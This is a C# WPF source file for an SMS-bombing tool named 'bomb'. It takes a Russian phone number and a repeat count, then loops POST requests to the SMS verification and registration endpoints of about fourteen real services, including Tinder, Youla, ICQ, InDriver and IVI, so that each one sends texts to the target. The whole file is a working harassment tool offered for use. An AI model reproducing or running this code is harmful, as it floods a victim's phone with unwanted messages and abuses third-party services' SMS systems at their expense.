﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Windows.Threading;

namespace bomb
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
            tbCount.IsReadOnly = true;
            DispatcherTimer timer = new DispatcherTimer();
        }

        private static string Post(string Url, string Data)
        {
            WebRequest req = WebRequest.Create(Url);
            req.Method = "POST";
            req.Timeout = 10000;
            req.ContentType = "applecation/x-www-form-urlencoded";
            byte[] sent = Encoding.GetEncoding(1251).GetBytes(Data);
            req.ContentLength = sent.Length;
            Stream send = req.GetRequestStream();
            send.Write(sent, 0, sent.Length);
            send.Close();
            WebResponse res = req.GetResponse();
            Stream ReceiveStream = res.GetResponseStream();
            StreamReader sr = new StreamReader(ReceiveStream, Encoding.UTF8);
            Char[] read = new char[256];
            int count = sr.Read(read, 0, 256);
            string Out = string.Empty;
            while (count > 0)
            {
                string str = new string(read, 0, count);
                Out += str;
                count = sr.Read(read, 0, 256);
            }
            return Out;
        }

        public void Send(string address, string mask, string name)
        {
            try
            {
                string Answer = Post(address, mask);
                tbReport.AppendText($"Сервис {name} подтвердил отправку\n");
            }
            catch 
            {
                tbReport.AppendText($"Не фартануло, {name} нам отказал.\n");
            }
        }

        private void TextBox_PreviewTextInput(object sender, TextCompositionEventArgs e)
        {
            e.Handled = "1234567890".IndexOf(e.Text) < 0;
        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            tbCount.Text =  (int.Parse(tbCount.Text)+1).ToString();
        }

        private void Button_Click_1(object sender, RoutedEventArgs e)
        {
            if (int.Parse(tbCount.Text) != 1)
                tbCount.Text = (int.Parse(tbCount.Text) - 1).ToString();
        }

        private void Button_Click_2(object sender, RoutedEventArgs e)
        {
            string phone = tbPhone.Text;
            for (int i = 0; i < int.Parse(tbCount.Text); i++)
            {
                Send("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", $"phone_number=+7{phone}", "Tinder");
                Send("https://app.karusel.ru/api/v1/phone/", $"phone=8{phone}", "Карусель");
                Send("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", $"phone=7{phone}", "Qlean");
                Send("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", $"phone=7{phone}", "AT PRIME");
                Send("https://youla.ru/web-api/auth/request_code", $"phone=+7{phone}", "Юла");
                Send($"https://www.citilink.ru/registration/confirm/phone/+ 7{phone}/", $"", "CityLink");
                Send("https://api.sunlight.net/v3/customers/authorization/", $"phone=7{phone}", "SunLight");
                Send("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", $"password=ctclutctc&application=lkp&login=+7{phone}", "Invitro");
                Send("https://api.delitime.ru/api/v2/signup", $"SignupForm[username]=7{phone}&SignupForm[device_type]=3", "DeliMobil");
                Send("https://api.mtstv.ru/v1/users", $"msisdn=7{phone}", "MTC");
                Send("https://moscow.rutaxi.ru/ajax_keycode.html", $"l={phone}", "Rutaxi");
                Send("https://www.icq.com/smsreg/requestPhoneValidation.php", $"msisdn=7{phone}&locale=en&countryCode=ru&version=1&k" +
                    $"=ic1rtwz1s1Hj1O0r&r=46763", "ICQ");
                Send("https://terra-1.indriverapp.com/api/authorization?locale=ru", $"mode=request&phone=+7{phone}&phone_permission=unknown&stream" +
                    $"_id=0&v=3&appversion=3.20.6&osversion=unknown&devicemodel=unknown", "InDriver");
                Send("https://api.ivi.ru/mobileapi/user/register/phone/v6", $"phone=7{phone}", "IVI");
            }
        }
    }
}
